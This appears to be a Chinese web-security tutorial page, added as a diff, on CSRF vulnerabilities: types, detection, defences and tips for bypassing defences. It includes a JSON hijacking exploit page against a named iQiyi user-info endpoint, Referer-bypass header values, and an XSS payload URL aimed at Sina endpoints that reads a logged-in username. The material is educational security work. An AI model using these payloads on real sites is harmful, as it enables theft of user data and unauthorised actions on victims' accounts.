@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>一、跨站请求伪造漏洞｜Web 安全 / XSS与客户端｜BEN.OPS</title>
+  <meta name="description" content="一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。">
+  <meta name="keywords" content="Web 安全，XSS与客户端，PHP，Java，XSS，CSRF，CORS，漏洞，Web 安全 / XSS与客户端，一、跨站请求伪造漏洞">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BPHP%2BJava-%E4%B8%80%E3%80%81%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="一、跨站请求伪造漏洞">
+  <meta property="og:description" content="一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="Web 安全 / XSS与客户端">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/90a3fdd366499708d4.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="一、跨站请求伪造漏洞">
+  <meta name="twitter:description" content="一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/90a3fdd366499708d4.png">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html#article","headline":"一、跨站请求伪造漏洞","description":"一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["Web 安全","XSS与客户端"],"keywords":["Web 安全","XSS与客户端","PHP","Java","XSS","CSRF","CORS","漏洞","Web 安全 / XSS与客户端","一、跨站请求伪造漏洞"],"wordCount":1939,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/90a3fdd366499708d4.png"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"Web 安全 / XSS与客户端","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"一、跨站请求伪造漏洞","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>Web 安全 / XSS与客户端</span> › <span>一、跨站请求伪造漏洞</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">Web 安全 / XSS与客户端</div>
+      <h1>一、跨站请求伪造漏洞</h1>
+      <p class="lede">一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">1,939 字</span>
+        <span class="badge">6 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<h2 id="一-跨站请求伪造漏洞">一、跨站请求伪造漏洞</h2>
+<p>跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。</p>
+<h2 id="二-漏洞的分类">二、漏洞的分类</h2>
+<p>CSRF漏洞从利用形式来看，分为“写”和“写-读”两类。</p>
+<h3 id="2-1-CSRF写-更改设置">2.1 CSRF写——更改设置</h3>
+<p>CSRF“写”是指攻击载体只需要发送HTTP请求的情况。
+这一类特征是Web应用程序在有登录态的情况下更改数据，是第三方站点只需要发送请求而不需要获得返回结果。如更改个人资料、发表文章、留言等，最简单的就是利用JavaScript 自动提交表单，很容易造成蠕虫攻击，如下所示：</p>
+<p><img alt="csrfch" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/90a3fdd366499708d4.png"/></p>
+<p>假设这个页面在 http://hacker.com 上，第一个点击打开页面的人自动发了一条心情，他的好友看到了进而又点击链接进入了恶意站点，导致不断地传播开来，造成蠕虫。</p>
+<p>如果是 get 请求可以触发的csrf，利用方式可以在一个正常的网站上插入一张图片（src 即存在漏洞cgi 地址），当别人浏览到这个页面时就会触发请求。</p>
+<h4 id="22-csrf">2.2 CSRF写和读——获取敏感信息</h4>
+<p>CSRF“写-读”是指攻击载体不仅要先发送HTTP请求，还要获取Web应用程序对该请求的返回内容的情况。
+这一类特征是Web应用程序在有登录态的情况下会输出敏感信息，第三方站点需要发送请求并还要获得返回结果，比如 JSON Hijacking和flash装载网页。
+JSON（JavaScript Object Notation）是一种轻量的数据交换格式，特别是在跨域交换数据的时候经常用到。一个简单的 jsonHijacking 利用 exp 如下：</p>
+<pre><code class="language-html">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
+
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+&lt;head&gt;
+  &lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+  &lt;script type="text/javascript"&gt;
+            var aaa="";
+            function testa(str)
+            {
+              aaa=str;
+            }
+  &lt;/script&gt;
+
+  &lt;script src="http://passport.iqiyi.com/apis/user/info.action?authcookie=&amp;fields=
+      userinfo%2Cqiyi_vip%2Cpps%2Caccounts%2Ctokens%2Cv&amp;antiCsrf=&amp;callback=testa" type="text/javascript"&gt;
+
+  &lt;/script&gt;
+
+  &lt;script type="text/javascript"&gt;
+    alert(JSON.stringify(aaa));  //可以进一步把数据发往攻击者的站点
+  &lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>另外一个地方是Flash。
+Flash的API 支持加载网页内容，如ActionScript 3.0提供的URLLoader类。但Flash装载站点内容必须得到站点根目录下的策略配置文件  crossdomain.xml的支持。如以下代码去读取www.example.com的返回内容（当然需要 http://www.example.com/crossdomain.xml 支持  flash所在域请求）：</p>
+<pre><code class="language-actionScript">import flash.net.*;
+var myloader = new URLLoader(new URLRequest("http://www.example.com/"));
+myloader.addEventListener(Event.COMPLETE,test);
+myloader.load();
+function test(event:Event){
+var ResponseText:String = myloader.data;
+text1.text = ResponseText;
+stop();
+}
+</code></pre>
+<p>如果该网页在用户登录态下会返回敏感信息，则这个flash可以获取到。</p>
+<h2 id="三-如何检测漏洞">三、如何检测漏洞</h2>
+<ol>
+<li>抓包重放
+点击某功能后，使用抓包工具抓包重放，看正常返回值</li>
+<li>去除refer/token
+去除refer/token参数，看返回值是否正常</li>
+<li>验证
+如果正常，本地构造表单测试能否复现</li>
+</ol>
+<p>jsonhijacking 形式的也许可以尝试下自动测试，比如cookie 中带uin 字段的，带上refer/去掉refer 都请求一次接口，看返回内容中是否都包含了uin 的值，或者若是根据其他参数key 如 g_tk 来做限制的，可以把g_tk 值去掉，看请求是否也返回敏感信息了。</p>
+<h2 id="四-如何防御">四、如何防御</h2>
+<ol>
+<li>
+<p>检查 http referer 是否是同域
+如果网站有客户端，需要对此开绿灯，可能是个隐患。
+注意：ajax 跨域发起请求时是不可以添加 cookie、user-agent、referer、 x_forward_for 等http 头的，可以看下w3c给出的一份头部黑名单。否则 referer 校验就无效了。
+此外在某些情况下，浏览器也不会发送referer，比如从https 跳转到 http；flash 的请求等。</p>
+</li>
+<li>
+<p>限制 cookie 的生命周期（减少发生概率）</p>
+</li>
+<li>
+<p>使用一次性 token
+token 是一段随机的数字字母值，经常出现在表单的隐藏项中。</p>
+</li>
+<li>
+<p>使用验证码（降低用户体验）
+当同域页面上有xss 漏洞时，可以通过 ajax 获取到其他页面的 token；
+token 如果出现在 get 参数中，也容易通过 refer的方式泄露；
+此时只能通过验证码来防范csrf 了。</p>
+</li>
+<li>
+<p>如果是会修改内容的请求，请使用post 请求，且在满足post 内容格式要求的情况下使用<code>Content-Type:application/json</code>，而当不同源客户端添加 <code>Content-Type</code>为 <code>application/json</code> 的时候浏览器会进行预检（发送OPTIONS请求），之后请求就会失败（服务器不要在 <code>Access-Control-Allow-Headers</code> 中加入 <code>Content-type</code>），而不会进一步发起真实的post请求，否则可能造成其实数据已经被post请求修改，虽然服务器返回响应时被浏览器拦截了。</p>
+</li>
+<li>
+<p>设置Set-Cookie 头部的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite" rel="noopener noreferrer">samesite 属性</a>，即允许声明该 Cookie 是否仅限于第一方或者同一站点上下文，即在跨域请求时第三方站点cookie 不会一起发送出去</p>
+</li>
+<li>
+<p>双重cookie校验。利用csrf 不能获取到用户cookie的特点，可以要求ajax和表单请求都携带一个cookie值
+- 在用户访问站点页面时，往cookie植入一个随机值xxx
+- 在前端往后端请求时获取到cookie值并携带到url 如 cgi?csrfcookie=xxx
+- 后端验证cookie中的字段值与url 参数值是否一致</p>
+</li>
+</ol>
+<h2 id="五-测试tips-分享">五、测试tips 分享</h2>
+<p>绕过csrf 防御技巧：
+1. refer 验证绕过：只验证了是否存在关键词，如
+<code>Referer:http://t.qq.com</code>可以使用
+<code>Referer:http://t.qq.com.yourdomain.com</code>
+<code>Referer:http://yourdomain.com/t.qq.com/</code>
+<code>Referer:http://yourdomain.com?r=http://t.qq.com</code>
+注：从https域下post数据到http域的时候，浏览器不带Referer；用 iframe 加载时也不带referer；比如本地html，还有某些伪协议远程调用时是没有referer的；
+2. 有时候存在token, 服务器端不一定做了验证，可以直接把 token 参数删除看是否能返回正常值；
+3. 将 post 请求换成对应的 get 请求，也许也可以绕过 refer 限制；
+4. 找到一个满足refer要求的站点的url 跳转漏洞绕过refer 校验。
+5. 利用xss 漏洞绕过refer 校验，如下payload 绕过了 data_ajax.php 的refer 校验</p>
+<pre><code>http://interface.sina.cn/yuedu/index_feed.d.json?page=1&amp;act=more&amp;jsoncallback=&lt;script&gt;function a(msg){alert(msg.data.login_info.username);}&lt;/script&gt;&lt;script src="http://xx.sina.com.cn/data_ajax.php?_a=top_data&amp;rnd=16721&amp;callback=a"&gt;&lt;/script&gt;
+</code></pre>
+<p><strong>注意</strong>：
+1. 从页面<code>document.referer</code> 获取的是当前页面的上一跳，而发起http 请求带的referer头 是指的当前发起请求时所在的页面
+2. 从页面<code>document.cookie</code> 获取的是当前域domain下的cookie（httponly属性的不行），如果发起跨域请求此时带的cookie头部，指的是目标域下的cookie，两者不相同
+3. 从浏览器页面发起的请求，自动带上referer和origin等头部（默认值），但如果抓包拦截是可以修改的（无法作为自动化攻击手段）；直接从服务器后台发起的请求，更是可以任意添加头部和值，且返回内容直接给到服务器后台，故也不存在浏览器的跨域策略限制等。</p>
+<h2 id="Reference">Reference</h2>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" rel="noopener noreferrer">OPTIONS 请求预检</a></p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#一-跨站请求伪造漏洞">一、跨站请求伪造漏洞</a></li><li style="margin-left:0.0rem"><a href="#二-漏洞的分类">二、漏洞的分类</a></li><li style="margin-left:0.8rem"><a href="#2-1-CSRF写-更改设置">2.1 CSRF写——更改设置</a></li><li style="margin-left:0.0rem"><a href="#三-如何检测漏洞">三、如何检测漏洞</a></li><li style="margin-left:0.0rem"><a href="#四-如何防御">四、如何防御</a></li><li style="margin-left:0.0rem"><a href="#五-测试tips-分享">五、测试tips 分享</a></li><li style="margin-left:0.0rem"><a href="#Reference">Reference</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：Web 安全 / XSS与客户端</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">Web 安全</span><span class="tag">XSS与客户端</span><span class="tag">PHP</span><span class="tag">Java</span><span class="tag">XSS</span><span class="tag">CSRF</span><span class="tag">CORS</span><span class="tag">漏洞</span></li>
+          <li><span>来源：01-Web安全/03-XSS与客户端/CSRF/CSRF.md</span></li><li><a href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-Web%20%E5%AE%89%E5%85%A8%2BXSS%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%2BPHP%2BJava-%E4%B8%80%E3%80%81%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E.md" type="text/markdown">查看 Markdown 原文</a></li>
+        </ul></div>
+        <div class="aside-box"><h2>作者</h2>
+          <p><a href="https://t.me/Ben_Bird">@Ben_Bird</a></p>
+          <p>Linux / DevOps / SRE / 云平台 / 安全运维</p>
+        </div>
+      </aside>
+    </div>
+    <section class="seo-summary" aria-labelledby="seo-summary-title">
+      <h2 id="seo-summary-title">文章摘要</h2>
+      <p>一、跨站请求伪造漏洞。本文属于Web 安全 / XSS与客户端，跨站请求伪造漏洞（Cross Site Request Forgery，常简写作CSRF，也有写作XSRF的）是指攻击者可以在第三方站点制造HTTP请求并以用户在目标站点的登录态发送到目标站点，而目标站点的应用程序未校验请求来源。</p>
+      <p>关键词：Web 安全、XSS与客户端、PHP、Java、XSS、CSRF、CORS、漏洞、Web 安全 / XSS与客户端、一、跨站请求伪造漏洞</p>
+    </section>
+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-d412c0c015b7.html"><small>上一篇</small>一、网络通信简介</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-6e9461ee3824.html"><small>下一篇</small>一、验证过滤用户的输入</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-1c852d5c0ac2.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
